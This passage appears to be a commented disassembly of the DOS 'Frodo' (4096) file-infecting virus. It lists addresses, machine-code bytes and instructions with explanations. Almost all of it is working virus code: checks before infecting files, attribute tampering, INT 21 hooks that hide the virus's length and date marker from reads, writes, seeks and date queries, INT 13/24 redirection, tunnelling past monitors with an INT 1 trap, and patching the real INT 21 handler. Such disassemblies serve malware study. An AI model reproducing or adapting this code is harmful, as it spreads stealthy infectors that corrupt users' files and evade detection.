0AB0 8BDA           MOV    BX,DX  ;Now BX:AX is # of free bytes on disk.

0AB2 5A             POP    DX    ;Restore DX.

0AB3 0BDB           OR     BX,BX   ;Check if there are more than FFFF bytes free.
0AB5 7505           JNZ    0ABC    ;If so then go on to 0ABC.

0AB7 3D0040         CMP    AX,4000  ;Check if there are 4096 or more bytes free.
0ABA 7243           JB     0AFF     ;If not then go to error part.

0ABC B80043         MOV    AX,4300      ;Get file attributes w/handle.
0ABF E8F204         CALL   0FB4         ;Go run INT 21.

0AC2 723B           JB     0AFF      ;Abort on error.

0AC4 8BF9           MOV    DI,CX    ;Put original file attribs in DI.

0AC6 33C9           XOR    CX,CX        ;All file attribs are off.
0AC8 B80143         MOV    AX,4301      ;Set file attributes w/handle.
0ACB E8E604         CALL   0FB4         ;Go run INT 21.

0ACE 2E803EDA1200   CMP    Byte Ptr CS:[12DA],00  ;Check if there's been
0AD4 7529           JNZ    0AFF  ;a critical error lately.  If so then abort.

0AD6 B8023D         MOV    AX,3D02    ;Open file w/handle, read/write.
0AD9 E8D804         CALL   0FB4         ;Go run INT 21.

0ADC 7221           JB     0AFF      ;Abort on error.

0ADE 8BD8           MOV    BX,AX      ;Put handle in BX.

0AE0 8BCF           MOV    CX,DI      ;Put original fattribs in CX.
0AE2 B80143         MOV    AX,4301   ;Set file attributes.
0AE5 E8CC04         CALL   0FB4         ;Go run INT 21.

0AE8 53             PUSH   BX     ;Save BX.

0AE9 2E8A162812     MOV    DL,CS:[1228]  ;Put drive no. of next oper. in DL.

0AEE B432           MOV    AH,32  ;Get Drive Parameter Block for specific
                                       ;drive (in DL).  DS:BX has address.
                                       ;Is undocumented and changes from DOS
                                       ;version to version.  This code works
                                       ;with version 3.x only, I think.
0AF0 E8C104         CALL   0FB4         ;Go run INT 21.

0AF3 8B471E         MOV    AX,[BX+1E]    ;Number of free clusters on disk
                                         ;(DOS 3.x only!)
                                         ;Saves this so that after infection
                                         ;it can set it back to the original
                                         ;number of free clusters.
0AF6 2EA3EC12       MOV    CS:[12EC],AX  ;Save it in memory.

0AFA 5B             POP    BX     ;Restore BX.

0AFB E88E03         CALL   0E8C  ;Restore original ints 13 and 24.
0AFE C3             RET

;Routine jumps here if there is an error or if there isn't enough room to
;infect a file.
0AFF 33DB           XOR    BX,BX
0B01 4B             DEC    BX           ;Set BX = FFFF.

0B02 E88703         CALL   0E8C      ;Set int 13 & 24 handlers.
0B05 C3             RET

;*******************************************************************************
;Procedure -- Find out if a handle is an infected file.
;Returns Zero Flag clear if it is an infected file being accessed.
;Is used by Frodo's routines that do "handle" things (create, read, etc.)
0B06 51             PUSH   CX     ;Save these.
0B07 52             PUSH   DX
0B08 50             PUSH   AX

0B09 B80044         MOV    AX,4400  ;IOCTL-Get device info (BX=handle).
0B0C E8A504         CALL   0FB4         ;Go run INT 21.

0B0F 80F280         XOR    DL,80    ;Check if handle is a file.

0B12 F6C280         TEST   DL,80    ;Is it?
0B15 7409           JZ     0B20     ;No so return.

0B17 B80057         MOV    AX,5700      ;Get file date & time w/handle.
0B1A E89704         CALL   0FB4         ;Go run INT 21.

0B1D F6C680         TEST   DH,80  ;Has fdate had 100 yrs added to it? (sets flag)

0B20 58             POP    AX      ;Restore these.
0B21 5A             POP    DX
0B22 59             POP    CX
0B23 C3             RET

;*******************************************************************************
;Procedure -- Get file length without disturbing file ptr (BX=handle).

;The procedure puts the file's length in CS:[12A9] (DWORD).

0B24 E8E803         CALL   0F0F     ;Save registers on Frodo's stack.

0B27 B80142         MOV    AX,4201   ;Set fptr to signed offset from
0B2A 33C9           XOR    CX,CX     ;current fptr (offset = 0).
0B2C 33D2           XOR    DX,DX   ;Probably gets current fptr for later.
0B2E E88304         CALL   0FB4      ;Go run INT 21.

0B31 2EA3A512       MOV    CS:[12A5],AX   ;Save current fptr in mem.
0B35 2E8916A712     MOV    CS:[12A7],DX

0B3A B80242         MOV    AX,4202   ;Set fptr to signed offset from
0B3D 33C9           XOR    CX,CX     ;file end (offset = 0).
0B3F 33D2           XOR    DX,DX     ;Used to find file's length.
0B41 E87004         CALL   0FB4         ;Go run INT 21.

0B44 2EA3A912       MOV    CS:[12A9],AX   ;Save file size in memory.
0B48 2E8916AB12     MOV    CS:[12AB],DX

0B4D B80042         MOV    AX,4200   ;Set fptr to abs offset from
0B50 2E8B16A512     MOV    DX,CS:[12A5] ;file start (offset = ?).
0B55 2E8B0EA712     MOV    CX,CS:[12A7] ;Sets fptr to what it was before.
0B5A E85704         CALL   0FB4         ;Go run INT 21.

0B5D E8A603         CALL   0F06   ;Restore registers off Frodo's stack.
0B60 C3             RET

;----------------------------------;
; Function 57 handler starts here. ;
;----------------------------------;
;Function 57 - Get or set file date and time.

;This part is for subfunction zero (get time).
0B61 0AC0           OR     AL,AL     ;Is AL equal to zero?
0B63 7522           JNZ    0B87      ;If not then go and check if AL is one.
0B65 2E8326B312FE   AND    Word Ptr CS:[12B3],FFFE    ;Clear Carry flag.

0B6B E88503         CALL   0EF3         ;Restore all registers.

0B6E E84304         CALL   0FB4         ;Go run INT 21.

0B71 720B           JB     0B7E         ;On error go to 0B7E.

0B73 F6C680         TEST   DH,80  ;Does date have 100 years added to it?
0B76 7403           JZ     0B7B   ;If not then go ahead and IRET to caller.
0B78 80EEC8         SUB    DH,C8  ;If so then adjust date so it doesn't have
                                       ;100 years added to it.
0B7B E9E1F8         JMP    045F   ;Set up and IRET to calling program.
;Comes here if there is an error after doing subfunction zero.
0B7E 2E830EB31201   OR     Word Ptr CS:[12B3],+01  ;Set carry flag.
0B84 E9D8F8         JMP    045F   ;Set up and IRET to calling program.

;This part is for subfunction one (set time).
0B87 3C01           CMP    AL,01   ;Is AL equal to one?
0B89 7537           JNZ    0BC2    ;If not then go and call original int 21.

0B8B 2E8326B312FE   AND    Word Ptr CS:[12B3],FFFE    ;Clear Carry flag.
0B91 F6C680         TEST   DH,80   ;Does date have 100 years added to it?
0B94 7403           JZ     0B99    ;If not then go to 0B99.
0B96 80EEC8         SUB    DH,C8   ;Subtract 100 years fromfile date.
0B99 E86AFF         CALL   0B06    ;Check if handle is an infected file.
0B9C 7403           JZ     0BA1    ;If not then go and run int 21.
0B9E 80C6C8         ADD    DH,C8   ;Add 100 years to file date.
0BA1 E81004         CALL   0FB4         ;Go run INT 21.

0BA4 8946FC         MOV    [BP-04],AX   ;Put error code (if there is one)
                                             ;on stack so it will be popped into
                                             ;AX later.
0BA7 2E8316B31200   ADC    Word Ptr CS:[12B3],+00  ;Set Carry flag if there is
                                                        ;an error from the call.
0BAD E906F9         JMP    04B6    ;Restore registers and then iret.

;----------------------------------;
; Function 42 handler starts here. ;
;----------------------------------;
;Function 42 - Set file pointer.

0BB0 3C02           CMP    AL,02  ;Is caller using "signed offset from
0BB2 750E           JNZ    0BC2   ;file end"?  If not then go back.

0BB4 E84FFF         CALL   0B06  ;Check if handle is an infected file.
0BB7 7409           JZ     0BC2  ;If not then go back.

;This part adjusts the CX and DX that are still on the stack so that the
;values that Frodo wants the handler to use will be popped off before the
;original int 21 is jumped to.
0BB9 816EF60010     SUB    Word Ptr [BP-0A],1000  ;Adjust CX:DX (fptr)
0BBE 835EF800       SBB    Word Ptr [BP-08],+00  ;so that Frodo is hidden.

0BC2 E96AF8         JMP    042F   ;Set up and call original int 21.

;----------------------------------;
; Function 3F handler starts here. ;
;----------------------------------;
;Function 3F - Read file or device.

0BC5 2E8026B312FE   AND    Byte Ptr CS:[12B3],FE  ;Clear Trap flag.
0BCB E838FF         CALL   0B06  ;Check if handle is an infected file.
0BCE 74F2           JZ     0BC2  ;If not then go back.

0BD0 2E890EAF12     MOV    CS:[12AF],CX   ;Save number of bytes to write.
0BD5 2E8916AD12     MOV    CS:[12AD],DX   ;Save buffer to write to.

0BDA 2EC706B1120000 MOV    Word Ptr CS:[12B1],0000

0BE1 E840FF         CALL   0B24        ;Get file length.

0BE4 2EA1A912       MOV    AX,CS:[12A9]  ;Put file's real length in DX:AX.
0BE8 2E8B16AB12     MOV    DX,CS:[12AB]

0BED 2D0010         SUB    AX,1000  ;Subtract Frodo's length from DX:AX.
0BF0 83DA00         SBB    DX,+00

0BF3 2E2B06A512     SUB    AX,CS:[12A5]  ;Subtract current file ptr from
0BF8 2E1B16A712     SBB    DX,CS:[12A7]  ;file length.

0BFD 7908           JNS    0C07  ;If answer is positive (or zero!) then 
                                      ;go on.

;If the answer is negative (meaning the file pointer is past file's end without
;Frodo) then it returns with bytes transferred (in AX) equal to zero.
0BFF C746FC0000     MOV    Word Ptr [BP-04],0000
0C04 E962FA         JMP    0669   ;Go back and iret to the caller.

0C07 7508           JNZ    0C11  ;If answer isn't zero then go to 0C11.

0C09 3BC1           CMP    AX,CX  ;Is there enough bytes at file end to
0C0B 7704           JA     0C11   ;read?  If so then go on to 0C11.

0C0D 2EA3AF12       MOV    CS:[12AF],AX  ;Adjust the number of bytes to
                                              ;read since there's less than
                                              ;requested at the end of the file.

0C11 2E8B16A512     MOV    DX,CS:[12A5] ;Move current file ptr into CX:DX.
0C16 2E8B0EA712     MOV    CX,CS:[12A7]

0C1B 0BC9           OR     CX,CX  ;If file ptr is higher than 64K then
0C1D 7505           JNZ    0C24   ;go on to 0C24.

0C1F 83FA1C         CMP    DX,+1C   ;Is caller reading the first 1C bytes?
0C22 761A           JBE    0C3E     ;If so then go to 0C3E.

0C24 2E8B16AD12     MOV    DX,CS:[12AD]  ;Restore original DX.
0C29 2E8B0EAF12     MOV    CX,CS:[12AF]  ;Restore original CX.

0C2E B43F           MOV    AH,3F        ;Read file or device.
0C30 E88103         CALL   0FB4         ;Go run INT 21.

0C33 2E0306B112     ADD    AX,CS:[12B1]
0C38 8946FC         MOV    [BP-04],AX   ;Put value for AX in stack so that
                                             ;it will be popped off later.
                                             ;(AX is the number of bytes read.)

0C3B E978F8         JMP    04B6    ;Restore registers and then iret.

;Routine comes here if the caller wants something within the first 1C bytes.
0C3E 8BF2           MOV    SI,DX  ;DX is the low half of the file ptr,
0C40 8BFA           MOV    DI,DX  ;which is the whole ptr since the high
                                       ;half is zero.

0C42 2E033EAF12     ADD    DI,CS:[12AF]  ;Add # of bytes to transfer to DI.

0C47 83FF1C         CMP    DI,+1C  ;Is it still below the first 1C bytes?
0C4A 7204           JB     0C50    ;If so then go to 0C50.

0C4C 33FF           XOR    DI,DI   ;Set DI = 0.
0C4E EB05           JMP    0C55    ;Go on to 0C55.

0C50 83EF1C         SUB    DI,+1C  ;Now DI is -(number of bytes that are
                                        ;within the first 1C bytes).
0C53 F7DF           NEG    DI      ;Now DI is the number of bytes that
;are within the first 1C bytes (now it's positive, too) that the caller wants.

0C55 8BC2           MOV    AX,DX   ;Move file ptr to AX now.

0C57 2E8B0EAB12     MOV    CX,CS:[12AB]  ;Put file's real size in CX:DX.
0C5C 2E8B16A912     MOV    DX,CS:[12A9]

0C61 83C20F         ADD    DX,+0F     ;Figure out pointer to the displaced
0C64 83D100         ADC    CX,+00     ;bytes at the start of the virus.
0C67 83E2F0         AND    DX,FFF0
0C6A 81EAFC0F       SUB    DX,0FFC
0C6E 83D900         SBB    CX,+00
0C71 03D0           ADD    DX,AX
0C73 83D100         ADC    CX,+00

0C76 B80042         MOV    AX,4200  ;Set file ptr to abs. off. from start.
0C79 E83803         CALL   0FB4         ;Go run INT 21.

0C7C B91C00         MOV    CX,001C    ;?
0C7F 2BCF           SUB    CX,DI      ;?
0C81 2BCE           SUB    CX,SI      ;?

0C83 B43F           MOV    AH,3F        ;Read file or device w/handle.
0C85 2E8B16AD12     MOV    DX,CS:[12AD] ;Put caller's buffer ptr in DX.
0C8A E82703         CALL   0FB4         ;Go run INT 21.

0C8D 2E0106AD12     ADD    CS:[12AD],AX  ;Adjust ptr to the buffer to write to.
;It adds the number of bytes read to the buffer ptr so that it points to the next
;spot in the buffer to read into.
0C92 2E2906AF12     SUB    CS:[12AF],AX  ;Adjust the number of bytes to read.
;It subtracts the number of bytes read from the number of bytes to read since
;it has already read that many bytes for the call.
0C97 2E0106B112     ADD    CS:[12B1],AX  ;Number of bytes read already.
;This is saved for later so the "number of bytes transferred" (in AX on return)
;is correct.

0C9C 33C9           XOR    CX,CX    ;Set file ptr to the end of the first
0C9E BA1C00         MOV    DX,001C  ;1C bytes since Frodo has already gotten
0CA1 B80042         MOV    AX,4200  ;what they should be.
0CA4 E80D03         CALL   0FB4     ;Go run INT 21.

0CA7 E97AFF         JMP    0C24     ;Go read the rest of the file.

;----------------------------------;
; Function 40 handler starts here. ;
;----------------------------------;
;Function 40 - Write file or device.

;This routine decides if a file write is going to write over the important
;parts of Frodo, and if it is then it DISINFECTS(!) the file.  If not then 
;it goes ahead and lets the write happen.

0CAA 2E8026B312FE   AND    Byte Ptr CS:[12B3],FE  ;Clear Trap flag.
0CB0 E853FE         CALL   0B06  ;Check if handle is an infected file.

0CB3 7503           JNZ    0CB8  ;If so then go on.
0CB5 E90AFF         JMP    0BC2  ;If not then go back.

0CB8 2E890EAF12     MOV    CS:[12AF],CX  ;Save number of bytes to write.
0CBD 2E8916AD12     MOV    CS:[12AD],DX  ;Save buffer to write to.

0CC2 2EC706B1120000 MOV    Word Ptr CS:[12B1],0000  ;Set "number of bytes
                                                 ;already transferred" to zero.

0CC9 E858FE         CALL   0B24        ;Get file length.

0CCC 2EA1A912       MOV    AX,CS:[12A9]  ;Put file's real length in DX:AX.
0CD0 2E8B16AB12     MOV    DX,CS:[12AB]

0CD5 2D0010         SUB    AX,1000    ;Take off length of Frodo's code.
0CD8 83DA00         SBB    DX,+00

0CDB 2E2B06A512     SUB    AX,CS:[12A5]  ;Subtract current file ptr from
0CE0 2E1B16A712     SBB    DX,CS:[12A7]  ;file length.

0CE5 7802           JS     0CE9    ;If answer is negative then go on.
0CE7 EB7E           JMP    0D67    ;Jump ahead to 0D67.

;Basically the section of code here removes Frodo from the file that is being
;written to because it's doing things that would kill off Frodo anyway.
0CE9 E8FA00         CALL   0DE6  ;Set ints 13 & 24 to Frodo's code.

0CEC 0E             PUSH   CS      ;Set DS = CS.
0CED 1F             POP    DS

0CEE 8B16A912       MOV    DX,[12A9]  ;Put file's real length in CX:DX.
0CF2 8B0EAB12       MOV    CX,[12AB]

0CF6 83C20F         ADD    DX,+0F       ;Figure out pointer to displaced bytes
0CF9 83D100         ADC    CX,+00       ;at start of virus.
0CFC 83E2F0         AND    DX,FFF0
0CFF 81EAFC0F       SUB    DX,0FFC
0D03 83D900         SBB    CX,+00

0D06 B80042         MOV    AX,4200   ;Set file ptr to abs off from start.
0D09 E8A802         CALL   0FB4         ;Go run INT 21.

0D0C BA0400         MOV    DX,0004   ;Points to a buffer at Frodo's start.
0D0F B91C00         MOV    CX,001C   ;Read 1C bytes.
0D12 B43F           MOV    AH,3F        ;Read file or device w/handle.
0D14 E89D02         CALL   0FB4         ;Go run INT 21.
;This buffer can be overwritten at this point since Frodo's host has already
;run and finished.

0D17 B80042         MOV    AX,4200  ;Set file ptr to abs off from start.
0D1A 33C9           XOR    CX,CX    ;Set it right to file start.
0D1C 8BD1           MOV    DX,CX
0D1E E89302         CALL   0FB4         ;Go run INT 21.

0D21 BA0400         MOV    DX,0004   ;Points to a buffer at Frodo's start.
0D24 B91C00         MOV    CX,001C   ;Write 1C bytes.
0D27 B440           MOV    AH,40      ;Write file or device w/handle.
0D29 E88802         CALL   0FB4         ;Go run INT 21.

0D2C BA00F0         MOV    DX,F000    ;Set file ptr to abs off from file
0D2F B9FFFF         MOV    CX,FFFF    ;end (points at Frodo's start).
0D32 B80242         MOV    AX,4202
0D35 E87C02         CALL   0FB4         ;Go run INT 21.

0D38 B440           MOV    AH,40   ;Write file or device w/handle.
0D3A 33C9           XOR    CX,CX   ;Truncate file (cuts off Frodo).
0D3C E87502         CALL   0FB4         ;Go run INT 21.

0D3F 8B16A512       MOV    DX,[12A5]  ;Set file ptr to what it was before.
0D43 8B0EA712       MOV    CX,[12A7]
0D47 B80042         MOV    AX,4200
0D4A E86702         CALL   0FB4         ;Go run INT 21.

0D4D B80057         MOV    AX,5700   ;Get file date and time.
0D50 E86102         CALL   0FB4         ;Go run INT 21.

0D53 F6C680         TEST   DH,80  ;Has file date had 100 years added to it?
0D56 7409           JZ     0D61   ;If not then go to 0D61.

0D58 80EEC8         SUB    DH,C8     ;Subtract 100 years from file date
0D5B B80157         MOV    AX,5701   ;and set it.
0D5E E85302         CALL   0FB4      ;Go run INT 21.

0D61 E82801         CALL   0E8C  ;Set ints 13 & 24 vectors to orig. vals.

0D64 E9C8F6         JMP    042F   ;Set up and call original int 21.

0D67 7507           JNZ    0D70  ;If file ptr isn't equal to file size then
                                      ;go to 0D70.
0D69 3BC1           CMP    AX,CX  ;If # of bytes to write is greater than
                                       ;number of bytes left before Frodo then
0D6B 7703           JA     0D70   ;go to 0D70.

0D6D E979FF         JMP    0CE9   ;Else go back to 0CE9.

0D70 2E8B16A512     MOV    DX,CS:[12A5]  ;Put current file ptr in CX:DX.
0D75 2E8B0EA712     MOV    CX,CS:[12A7]

;If file is an EXE file and its header is being written to then the routine
;goes back and disinfects the file.
0D7A 0BC9           OR     CX,CX   ;Is CX = 0 (Is file size > 64K)?
0D7C 7508           JNZ    0D86    ;If not then go on to 0D86.

0D7E 83FA1C         CMP    DX,+1C  ;Is caller wanting to write to first
                                        ;1C bytes (the EXE header)?
0D81 7703           JA     0D86    ;If not then go on to 0D86.
0D83 E963FF         JMP    0CE9    ;If so then go back to 0CE9.

0D86 E86A01         CALL   0EF3         ;Restore all registers.

0D89 E82802         CALL   0FB4         ;Go run INT 21.

0D8C E83801         CALL   0EC7         ;Save all registers.

0D8F B80057         MOV    AX,5700   ;Get date & time of file w/handle.
0D92 E81F02         CALL   0FB4         ;Go run INT 21.

0D95 F6C680         TEST   DH,80    ;Has year had 100 added to it?
0D98 7509           JNZ    0DA3     ;Yes, go on.
0D9A 80C6C8         ADD    DH,C8    ;Add 100 to the file's year.

0D9D B80157         MOV    AX,5701   ;Set date & time of file w/handle.
0DA0 E81102         CALL   0FB4         ;Go run INT 21.

0DA3 E910F7         JMP    04B6    ;Restore registers and then iret.

0DA6 E986F6         JMP    042F   ;Set up and call original int 21.

;-------------------------------;
; Frodo's interrupt 13 handler. ;
;-------------------------------;
;Int 13 is the BIOS disk interrupt.
0DA9 2E8F064112     POP    CS:[1241]  ;Get CS:IP of the int 13 caller
0DAE 2E8F064312     POP    CS:[1243]  ;and put it in memory.

0DB3 2E8F06DB12     POP    CS:[12DB]  ;Get flags.

0DB8 2E8326DB12FE   AND    Word Ptr CS:[12DB],FFFE  ;Clear Carry flag.
0DBE 2E803EDA1200   CMP    Byte Ptr CS:[12DA],00  ;Check for previous 
                                          ;errors (This is Frodo's own critical
                                          ;error flag).
0DC4 7511           JNZ    0DD7  ;Skip real int 13 if previous errors.

0DC6 2EFF36DB12     PUSH   CS:[12DB]       ;Push flags back on stack.
0DCB 2EFF1E2D12     CALL   FAR CS:[122D]   ;Call the real int 13.

0DD0 7306           JNB    0DD8    ;On no error go back to caller.

0DD2 2EFE06DA12     INC    Byte Ptr CS:[12DA]  ;Increment the critical error flag.
0DD7 F9             STC         ;Set the Carry flag.

0DD8 2EFF2E4112     JMP    FAR CS:[1241]   ;Jump back to caller.

;-------------------------------;
; Frodo's interrupt 24 handler. ;
;-------------------------------;
;Int 24 is the DOS critical error handler.
0DDD 32C0           XOR    AL,AL      ;Tell caller to "ignore" the error.
0DDF 2EC606DA1201   MOV    Byte Ptr CS:[12DA],01   ;Set Frodo's error byte.
0DE5 CF             IRET

;*******************************************************************************
;Procedure -- Checks for a hard disk, does a reset, and sets ints 13 & 24
;to Frodo's code.
0DE6 2EC606DA1200   MOV    Byte Ptr CS:[12DA],00  ;Set int 24 status byte to zero.

0DEC E82001         CALL   0F0F     ;Save registers on Frodo's stack.

0DEF 0E             PUSH   CS          ;Set DS = CS.
0DF0 1F             POP    DS

0DF1 B013           MOV    AL,13
0DF3 E8BFF3         CALL   01B5     ;Get int 13 vector address.

0DF6 891E2D12       MOV    [122D],BX   ;Save address in memory.
0DFA 8C062F12       MOV    [122F],ES

0DFE 891E3912       MOV    [1239],BX   ;Save address in memory.
0E02 8C063B12       MOV    [123B],ES

;The next part checks if ints 0D and 0E point to ROM.  If not then it assumes
;that int 13 has also been trapped by some routine, and then it uses int 1 to
;get the address of the ACTUAL int 13 handler (the real thing) in CS:122D.
0E06 B200           MOV    DL,00   ;Set DL to 00 to start off with.

0E08 B00D           MOV    AL,0D   ;Get address of int 0D, which is the
0E0A E8A8F3         CALL   01B5    ;IRQ5 fixed disk on PC,XT only!!!

0E0D 8CC0           MOV    AX,ES    ;Put segment in AX.
0E0F 3D00C0         CMP    AX,C000  ;Is segment above C000?
0E12 7302           JNB    0E16     ;Yes, so go to 0E16.
0E14 B202           MOV    DL,02   ;No, so put 02 in DL.

0E16 B00E           MOV    AL,0E   ;Get address of int 0E, which is the
0E18 E89AF3         CALL   01B5    ;IRQ6 floppy disk on PC,XT,AT,PS/2.

0E1B 8CC0           MOV    AX,ES    ;Put segment in AX.
0E1D 3D00C0         CMP    AX,C000  ;Is segment above C000?
0E20 7302           JNB    0E24     ;Yes, so go to 0E16.
0E22 B202           MOV    DL,02   ;No, so put 02 in DL.

0E24 88165012       MOV    [1250],DL  ;Put value of DL in memory.

0E28 E81101         CALL   0F3C   ;Save orig. int 1 addr. and replace it.

0E2B 8C16DD12       MOV    [12DD],SS  ;Save stack ptr in case int 1 jumps
0E2F 8926DF12       MOV    [12DF],SP  ;back to this routine.

0E33 0E             PUSH   CS       ;Set up so that the RETF that is
0E34 B8400D         MOV    AX,0D40  ;found in segment 0070 jumps to
0E37 50             PUSH   AX       ;CS:0D40 (actually 0E60 here).

0E38 B87000         MOV    AX,0070   ;Set ES = 0070.
0E3B 8EC0           MOV    ES,AX
0E3D B9FFFF         MOV    CX,FFFF     ;Scan FFFF bytes.
0E40 B0CB           MOV    AL,CB    ;Scans for the RETF command.
0E42 33FF           XOR    DI,DI    ;DI points to start of segment.
0E44 F2             REPNZ           ;Scan until it is found.
0E45 AE             SCASB

0E46 4F             DEC    DI       ;DI points at RETF in seg 0070.

0E47 9C             PUSHF           ;Put flags, ES, and DI on stack so
0E48 06             PUSH   ES       ;that the IRET at the end of int 13
0E49 57             PUSH   DI       ;will jump to the RETF in seg 0070.

0E4A 9C             PUSHF           ;Put flags register in AX.
0E4B 58             POP    AX
0E4C 80CC01         OR     AH,01    ;Set Trap flag.
0E4F 50             PUSH   AX       ;Put AX on stack...

0E50 E421           IN     AL,21    ;Get interrupt mask flag
0E52 A2E512         MOV    [12E5],AL  ;and save it in memory.

0E55 B0FF           MOV    AL,FF       ;Turn off hardware interrupts.
0E57 E621           OUT    21,AL

0E59 9D             POPF            ;...and pop it into the flags reg.

0E5A 33C0           XOR    AX,AX       ;Do a disk reset (drive # in DL=23).
0E5C FF2E2D12       JMP    FAR [122D]     ;Jump to original int 13.

;Int 13 now executes, and when the disk reset is done, it IRETs to some
;offset in segment 0070 and then executes the RETF command, sending it to
;the next line in this routine.  This is probably to keep snooping programs 
;from seeing the address of the actual caller, which is the virus.

0E60 C5163112       LDS    DX,[1231]  ;Retrieve original int 1 address.
0E64 B001           MOV    AL,01
0E66 E85302         CALL   10BC       ;Set int 1 vector to DS:DX.

0E69 0E             PUSH   CS        ;Set DS = CS.
0E6A 1F             POP    DS

0E6B BA890C         MOV    DX,0C89
0E6E B013           MOV    AL,13
0E70 E84902         CALL   10BC       ;Set int 13 vector to DS:DX.

0E73 B024           MOV    AL,24
0E75 E83DF3         CALL   01B5       ;Get int 24 vector.

0E78 891E3D12       MOV    [123D],BX  ;Save it in memory.
0E7C 8C063F12       MOV    [123F],ES

0E80 BABD0C         MOV    DX,0CBD
0E83 B024           MOV    AL,24
0E85 E83402         CALL   10BC       ;Set int 24 vector to DS:DX.

0E88 E87B00         CALL   0F06   ;Restore registers off Frodo's stack.
0E8B C3             RET

;*******************************************************************************
;Procedure -- Sets int 13 and int 24 vectors to original values.
;It is called several times, as well as jumped to by trojan boot sector thing.
0E8C E88000         CALL   0F0F     ;Save registers on Frodo's stack.

0E8F 2EC5163912     LDS    DX,CS:[1239]
0E94 B013           MOV    AL,13
0E96 E82302         CALL   10BC    ;Set int 13 vector to addr. in DS:DX.

0E99 2EC5163D12     LDS    DX,CS:[123D]
0E9E B024           MOV    AL,24
0EA0 E81902         CALL   10BC    ;Set int 24 vector to addr. in DS:DX.

0EA3 E86000         CALL   0F06   ;Restore registers off Frodo's stack.
0EA6 C3             RET

;*******************************************************************************
;Procedure -- Save original Break flag setting and set it to zero.
0EA7 B80033         MOV    AX,3300      ;Get Break flag.
0EAA E80701         CALL   0FB4         ;Go run INT 21.

0EAD 2E8816E112     MOV    CS:[12E1],DL    ;Save Break flag in memory.

0EB2 B80133         MOV    AX,3301      ;Set Break flag.
0EB5 32D2           XOR    DL,DL        ;Set it to OFF.
0EB7 E8FA00         CALL   0FB4         ;Go run INT 21.

0EBA C3             RET

;*******************************************************************************
;Procedure -- Restore original Break flag setting.
0EBB 2E8A16E112     MOV    DL,CS:[12E1]   ;Restores original Break flag.
0EC0 B80133         MOV    AX,3301      ;Set Break flag.
0EC3 E8EE00         CALL   0FB4         ;Go run INT 21.

0EC6 C3             RET

;*******************************************************************************
;Procedure -- Save all registers and return to caller.
0EC7 2E8F06EA12     POP    CS:[12EA]  ;Pop offset of caller off stack into mem.
0ECC 9C             PUSHF
0ECD 50             PUSH   AX
0ECE 53             PUSH   BX
0ECF 51             PUSH   CX
0ED0 52             PUSH   DX
0ED1 56             PUSH   SI
0ED2 57             PUSH   DI
0ED3 1E             PUSH   DS
0ED4 06             PUSH   ES
0ED5 2EFF26EA12     JMP    CS:[12EA]  ;Jump to the offset popped off of stack.

;*******************************************************************************
;Procedure -- Switch 1st 5 bytes of real int 21 handler w/ 5 byte jmp to Frodo.
0EDA 2EC43E3512     LES    DI,CS:[1235]  ;Get real int 21 addr in ES:DI.

0EDF BE4B12         MOV    SI,124B    ;Point DS:SI at a 5 byte buffer.
0EE2 0E             PUSH   CS           ;Set DS = CS.
0EE3 1F             POP    DS

0EE4 FC             CLD        ;Memory operations go up.

0EE5 B90500         MOV    CX,0005    ;Set up to loop 5 times.

0EE8 AC             LODSB   ;Get a byte of the jump statement.
0EE9 268605         XCHG   AL,ES:[DI]   ;Switch it with the real int 21.
0EEC 8844FF         MOV    [SI-01],AL   ;Save real byte to the buffer.
0EEF 47             INC    DI           ;Get ready for next loop.
0EF0 E2F6           LOOP   0EE8       ;Do it 5 times.

0EF2 C3             RET

;*******************************************************************************
;Procedure -- Restore all registers and return to caller.
0EF3 2E8F06EA12     POP    CS:[12EA]  ;Pop offset of caller off stack into mem.
0EF8 07             POP    ES
0EF9 1F             POP    DS
0EFA 5F             POP    DI
0EFB 5E             POP    SI
0EFC 5A             POP    DX
0EFD 59             POP    CX
0EFE 5B             POP    BX
0EFF 58             POP    AX
0F00 9D             POPF
0F01 2EFF26EA12     JMP    CS:[12EA]  ;Jump to the offset popped off of stack.

;----------------------------------;
; The following two procedures are ;
; able to keep track of Frodo's    ;
; very own stack without messing   ;
; up the current program's stack.  ;
;----------------------------------;

;*******************************************************************************
;Procedure -- Save all registers on Frodo's stack.
0F06 2EC7065D13D30D MOV    Word Ptr CS:[135D],0DD3
0F0D EB07           JMP    0F16

;*******************************************************************************
;Procedure -- Restore all registers from Frodo's stack.
0F0F 2EC7065D13A70D MOV    Word Ptr CS:[135D],0DA7

;This part is used by both of the above procedures.
0F16 2E8C165913     MOV    CS:[1359],SS     ;Save original SS and SP.
0F1B 2E89265713     MOV    CS:[1357],SP     ;(they point at orig. stack)

0F20 0E             PUSH   CS             ;Set SS = CS.
0F21 17             POP    SS

0F22 2E8B265B13     MOV    SP,CS:[135B]  ;Set SP to value in mem.

0F27 2EFF165D13     CALL   CS:[135D]    ;This calls a different routine
                                             ;according to whether 0F06 or
                                             ;0F0D is called.

0F2C 2E89265B13     MOV    CS:[135B],SP   ;Save SP to mem.

0F31 2E8E165913     MOV    SS,CS:[1359]   ;Restore the original SS
0F36 2E8B265713     MOV    SP,CS:[1357]   ;and SP.
0F3B C3             RET

;*******************************************************************************
;Procedure -- Save addr. of real int 1 in memory, and set int 1 to Frodo.
0F3C B001           MOV    AL,01    ;Get address of int 1 in ES:BX.
0F3E E874F2         CALL   01B5

0F41 2E891E3112     MOV    CS:[1231],BX    ;Save it in memory.
0F46 2E8C063312     MOV    CS:[1233],ES

0F4B 0E             PUSH   CS             ;Set DS = CS.
0F4C 1F             POP    DS

0F4D BA2300         MOV    DX,0023    ;Set address of int 1 to DS:DX.
0F50 E86901         CALL   10BC
0F53 C3             RET

;---------------------------------;
; Function 48 handler starts here ;
;---------------------------------;
;Function 48 - Allocate memory block.

;Checks if there is a free block the size of Frodo below the current address.
;If there is then it moves itself down.

0F54 E80300         CALL   0F5A   ;Go do the mem block thing.
0F57 E9D5F4         JMP    042F   ;Set up and call original int 21.

;*******************************************************************************
;Procedure -- Try to move Frodo in case someone wants a new memory block.
0F5A 2E803EE21200   CMP    Byte Ptr CS:[12E2],00  ;Check if it's okay to move Frodo.
0F60 7448           JZ     0FAA      ;If not (CS:[12E2]=00) then go back.

0F62 83FBFF         CMP    BX,FFFF  ;If caller isn't checking for size
0F65 7543           JNZ    0FAA     ;of largest mem block then go on.

0F67 BB6001         MOV    BX,0160  ;Try to get a block the size of Frodo.
0F6A E84700         CALL   0FB4         ;Go run INT 21.
0F6D 723B           JB     0FAA     ;On error go back.

0F6F 8CCA           MOV    DX,CS   ;Put current segment in DX.

0F71 3BC2           CMP    AX,DX  ;If new segment is below Frodo's
